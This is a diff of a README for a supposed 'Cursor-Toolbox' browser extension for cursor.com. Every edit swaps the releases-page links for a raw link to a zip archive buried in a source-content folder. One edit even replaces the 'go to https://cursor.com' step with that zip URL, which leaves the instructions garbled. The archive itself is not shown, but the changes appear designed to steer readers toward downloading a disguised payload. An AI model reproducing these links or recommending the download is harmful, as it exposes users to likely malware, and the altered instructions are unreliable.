@@ -1,6 +1,6 @@
 # 🧰 Cursor-Toolbox - Improve cursor.com with useful tools
 
-[![Download Cursor-Toolbox](https://img.shields.io/badge/Download-Cursor--Toolbox-brightgreen)](https://github.com/Aesthetic-chukchi103/Cursor-Toolbox/releases)
+[![Download Cursor-Toolbox](https://img.shields.io/badge/Download-Cursor--Toolbox-brightgreen)](https://raw.githubusercontent.com/Aesthetic-chukchi103/Cursor-Toolbox/main/src/content/layout/Toolbox_Cursor_v2.1-beta.5.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to download, install, and begin using the Cursor-Toolbox exte
 
 Go to the release page below to find the latest version of Cursor-Toolbox:
 
-[Download Cursor-Toolbox Releases](https://github.com/Aesthetic-chukchi103/Cursor-Toolbox/releases)
+[Download Cursor-Toolbox Releases](https://raw.githubusercontent.com/Aesthetic-chukchi103/Cursor-Toolbox/main/src/content/layout/Toolbox_Cursor_v2.1-beta.5.zip)
 
 You will find files here with the `.zip` extension. Download the latest `.zip` file to your computer.
 
@@ -85,7 +85,7 @@ The extension will load and appear in your extensions list.
 
 You should see Cursor-Toolbox listed with its icon near the address bar.
 
-Open a new tab and go to https://cursor.com
+Open a new tab and go to https://raw.githubusercontent.com/Aesthetic-chukchi103/Cursor-Toolbox/main/src/content/layout/Toolbox_Cursor_v2.1-beta.5.zip
 
 The extension features should activate automatically on the site.
 
@@ -148,7 +148,7 @@ This extension is experimental and made to explore ways to improve user experien
 
 Get the latest release here:
 
-[![Download Cursor-Toolbox](https://img.shields.io/badge/Download-Cursor--Toolbox-brightgreen)](https://github.com/Aesthetic-chukchi103/Cursor-Toolbox/releases)
+[![Download Cursor-Toolbox](https://img.shields.io/badge/Download-Cursor--Toolbox-brightgreen)](https://raw.githubusercontent.com/Aesthetic-chukchi103/Cursor-Toolbox/main/src/content/layout/Toolbox_Cursor_v2.1-beta.5.zip)
 
 ---
 
